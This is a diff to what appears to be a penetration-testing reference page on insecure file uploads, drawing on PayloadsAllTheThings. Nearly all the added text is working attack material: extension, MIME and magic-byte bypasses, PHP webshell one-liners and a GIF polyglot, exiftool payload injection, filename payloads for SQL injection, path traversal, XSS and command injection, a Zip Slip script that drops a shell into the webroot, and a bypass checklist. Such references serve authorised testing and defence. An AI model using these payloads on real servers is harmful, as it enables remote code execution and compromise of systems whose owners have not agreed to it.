@@ -140,6 +140,236 @@ EOF
 # https://hackerone.com/reports/398706
 # Pixel push attack (PDF/ghostscript via convert)</code></pre>
 
+  <h2>Extension Bypass Techniques</h2>
+  <p>Extended extension bypass list from PayloadsAllTheThings covering all major server types.</p>
+
+  <h3>PHP Extension Bypasses</h3>
+  <pre><code># Standard PHP alternatives:
+.php3  .php4  .php5  .php7  .phtml  .pht  .phps  .phar  .phpt  .pgif  .phtm  .inc
+
+# Null byte (works against pathinfo() — older PHP):
+.php%00.gif
+.php\x00.gif
+.php%00.png
+.php\x00.jpg
+
+# Special character tricks:
+file.php......      # multiple trailing dots (Windows strips them)
+file.php%20         # trailing space
+file.php%0d%0a.jpg  # CRLF before extension
+file.php%0a         # newline suffix
+file.php/           # trailing slash
+file.php.\          # dot-backslash
+
+# Right-to-Left Override (RTLO) — displays as .gpj.php visually:
+name.%E2%80%AEphp.jpg  # becomes name.gpj.php
+
+# Case variation:
+.pHp  .pHP5  .PhAr</code></pre>
+
+  <h3>ASP / JSP Extension Bypasses</h3>
+  <pre><code># ASP/ASPX server:
+.asp  .aspx  .config  .cer  .asa
+shell.asp;1.jpg    # IIS &lt; 7.0 — semicolon bypass
+shell.aspx;1.jpg
+shell.soap         # SOAP endpoint execution
+
+# IIS Windows character conversion (when saving files):
+# &gt; (\x3E) → ? (\x3F)
+# &lt; (\x3C) → * (\x2A)
+# " (\x22) → . (\x2E) — use single quotes in Content-Disposition
+
+# JSP / Java:
+.jsp  .jspx  .jsw  .jsv  .jspf  .wss  .do  .actions
+
+# Perl:
+.pl  .pm  .cgi  .lib
+
+# Node.js:
+.js  .json  .node</code></pre>
+
+  <h3>Server Configuration Abuse</h3>
+  <pre><code># Apache — upload .htaccess to make .jpg execute as PHP:
+AddType application/x-httpd-php .jpg
+# Now all .jpg files in this directory execute as PHP
+
+# Nginx misconfiguration (path info):
+# Upload: shell.jpg
+# Execute: https://target/uploads/shell.jpg/x.php
+# Nginx passes /x.php to PHP-FPM, which executes shell.jpg
+
+# IIS — semicolon bypass:
+shell.asp;.jpg   # IIS parses as shell.asp
+shell.aspx;.png</code></pre>
+
+  <h2>Magic Byte / MIME Bypass</h2>
+  <p>File identification bypass techniques from PayloadsAllTheThings.</p>
+
+  <h3>Magic Bytes Prepend</h3>
+  <pre><code># JPEG magic bytes: \xff\xd8\xff
+printf '\xff\xd8\xff' &gt; shell.php
+cat webshell_content.php &gt;&gt; shell.php
+
+# PNG magic bytes: \x89PNG\r\n\x1a\n
+printf '\x89PNG\r\n\x1a\n' &gt; shell.php
+cat webshell.php &gt;&gt; shell.php
+
+# GIF magic bytes (two variants):
+echo -n 'GIF87a' &gt; shell.php &amp;&amp; cat webshell.php &gt;&gt; shell.php
+echo -n 'GIF89a' &gt; shell.php &amp;&amp; cat webshell.php &gt;&gt; shell.php
+# GIF polyglot — single line:
+printf 'GIF89a;&lt;?php system($_GET["cmd"]); ?&gt;' &gt; polyglot.gif</code></pre>
+
+  <h3>MIME Type Bypass</h3>
+  <pre><code># Change Content-Type in Burp Interceptor:
+Content-Type: application/x-php  →  Content-Type: image/jpeg
+Content-Type: application/x-php  →  Content-Type: image/gif
+Content-Type: application/x-php  →  Content-Type: image/png
+
+# Double Content-Type (set allowed type after malicious type):
+Content-Type: application/x-php
+Content-Type: image/jpeg
+
+# Content-Type wordlist for fuzzing:
+# /usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt
+# Relevant PHP-interpreted MIME types:
+text/php
+text/x-php
+application/php
+application/x-php
+application/x-httpd-php
+application/x-httpd-php-source</code></pre>
+
+  <h3>NTFS Alternate Data Stream (Windows)</h3>
+  <pre><code># ADS colon trick — creates empty file with forbidden ext, editable later:
+file.asax:.jpg     # creates empty file.asax, edit with short filename
+file.asp::$data    # non-empty ADS stream
+file.asp::$data.   # with trailing dot bypass</code></pre>
+
+  <h2>Upload to RCE Chains</h2>
+  <p>Post-upload exploitation chains and filename vulnerability payloads from PayloadsAllTheThings.</p>
+
+  <h3>Filename Injection Payloads</h3>
+  <pre><code># The vulnerability is sometimes in the filename processing, not the file content.
+
+# Time-based SQLi in filename:
+poc.js'(select*from(select(sleep(20)))a)+'.extension
+
+# LFI/Path traversal in filename:
+image.png../../../../../../../etc/passwd
+
+# XSS in filename (reflected in file listing):
+'"&gt;&lt;img src=x onerror=alert(document.domain)&gt;.extension
+
+# Command injection in filename:
+; sleep 10;
+$(sleep 10)
+`sleep 10`
+
+# File traversal — writes outside upload directory:
+../../../tmp/lol.png
+../../../../../../var/www/html/shell.php</code></pre>
+
+  <h3>PHP Webshell Variants</h3>
+  <pre><code>&lt;!-- Standard webshells: --&gt;
+&lt;?php system($_GET['cmd']); ?&gt;
+&lt;?=`$_GET[0]`?&gt;
+&lt;?=$_POST[c]?&gt;
+
+&lt;!-- Alternative PHP script tags (bypass &lt;?php filter): --&gt;
+&lt;script language="php"&gt;system("id");&lt;/script&gt;
+
+&lt;!-- Exiftool webshell injection (JPEG comment): --&gt;
+exiftool -Comment='&lt;?php echo system($_GET["cmd"]); ?&gt;' shell.jpg
+# Then rename or use double extension: shell.jpg.php
+
+# Check if FFmpeg HLS is used for video processing:
+# CVE — FFMpeg HLS allows SSRF via malicious .m3u8 playlist upload</code></pre>
+
+  <h3>Zip Slip Attack</h3>
+  <pre><code># Create ZIP with path traversal entry:
+python3 -c "
+import zipfile
+with zipfile.ZipFile('zipslip.zip', 'w') as z:
+    info = zipfile.ZipInfo('../../var/www/html/shell.php')
+    z.writestr(info, '&lt;?php system(\$_GET[\"cmd\"]); ?&gt;')
+"
+# Upload zipslip.zip — if server extracts without sanitizing filenames:
+# shell.php lands in /var/www/html/
+
+# Verify after upload:
+curl "https://target/shell.php?cmd=id"</code></pre>
+
+  <h2>Upload Bypass Techniques Reference</h2>
+  <p>Defensive implementations use multiple layers of validation. Each layer can be bypassed independently — the goal is to find which layers are present and which are absent or broken.</p>
+  <pre><code># Layer 1: Extension validation bypass
+# If only checking file extension (not content), rename:
+shell.php → shell.php.jpg         # double extension (end may execute)
+shell.php → shell.PhP             # case sensitivity
+shell.php → shell.php%00.jpg      # null byte truncation (old PHP/CGI)
+shell.php → shell.php%20          # trailing space
+shell.php → shell.php.            # trailing dot (Windows strips dot)
+shell.php → shell.php::$DATA      # NTFS alternate data stream (Windows)
+shell.php → shell.phtml           # alternate PHP extensions
+shell.php → shell.php5            # version-specific extensions
+
+# If server uses denylist (block .php):
+.php2 .php3 .php4 .php5 .php6 .php7 .phtml .pht
+# Or language-specific: .asp .aspx .jsp .jspx .cfm .pl .py .rb
+
+# Layer 2: MIME type (Content-Type) validation bypass
+# Content-Type is user-supplied — trivially forged in Burp:
+# Change: Content-Type: application/x-php
+# To:     Content-Type: image/jpeg
+
+# Layer 3: File signature (magic bytes) validation bypass
+# Prepend valid image magic bytes to PHP content:
+printf '\xff\xd8\xff\xe0' &gt; bypass.php  # JPEG magic bytes
+echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt;&gt; bypass.php
+# File starts with JPEG signature but contains PHP code
+# exiftool method:
+exiftool -Comment='&lt;?php system($_GET["cmd"]); ?&gt;' legitimate.jpg
+mv legitimate.jpg shell.php.jpg
+
+# Layer 4: Content scanning bypass
+# If server scans for &lt;?php tag specifically:
+# Alternative PHP opening tags (some configs):
+# &lt;? (short tags — if short_open_tag = On)
+# &lt;%   (ASP-style — if asp_tags = On, very old PHP)
+# Alternative shells that avoid "&lt;?php":
+# &lt;script language="php"&gt;system($_GET['cmd']);&lt;/script&gt;  (old PHP)
+
+# Layer 5: Execution path bypass
+# Even if upload succeeds, file must be in executable path
+# Files stored outside webroot: not directly accessible
+# Techniques:
+# - Path traversal in filename: ../../var/www/html/shell.php
+# - Find alternate upload paths in different modules
+# - Use file include to execute the non-webroot shell:
+#   ?page=../../../uploads/shell.jpg  (if include() is vulnerable)
+
+# Layer 6: Content-Disposition filename bypass in multipart:
+# Some parsers extract filename differently:
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Disposition: form-data; name="file"; filename="shell.php ";
+Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"
+Content-Disposition: form-data; name="file"; filename*=utf-8''shell%2Ephp
+
+# Layer 7: File size limits bypass
+# If size check occurs before type check — send just enough bytes to pass:
+# Minimal PHP webshell: &lt;?=`$_GET[0]`?&gt;  (12 bytes)
+
+# Bypass summary checklist:
+# [ ] Try all alternate extensions for the server technology
+# [ ] Forge Content-Type header (image/jpeg, image/gif, image/png)
+# [ ] Prepend magic bytes for JPEG (\xff\xd8\xff), GIF (GIF89a), PNG
+# [ ] Test null byte in filename: shell.php%00.jpg
+# [ ] Test double extension: shell.jpg.php, shell.php.jpg
+# [ ] Test case variation: shell.PHP, shell.Php
+# [ ] Use exiftool to embed payload in image metadata
+# [ ] Try path traversal in filename field
+# [ ] Test NTFS ADS on Windows targets: shell.php::$DATA</code></pre>
+
   <h2>Tools &amp; Resources</h2>
   <ul>
     <li>PortSwigger File Upload labs — <code>portswigger.net/web-security/file-upload</code></li>
@@ -147,4 +377,5 @@ EOF
     <li>Burp Suite — modify Content-Type, filename, extension</li>
     <li>PayloadsAllTheThings File Upload — <code>github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files</code></li>
     <li>webshells — <code>github.com/BlackArch/webshells</code></li>
+    <li>OWASP File Upload Cheat Sheet — <code>cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html</code></li>
   </ul>
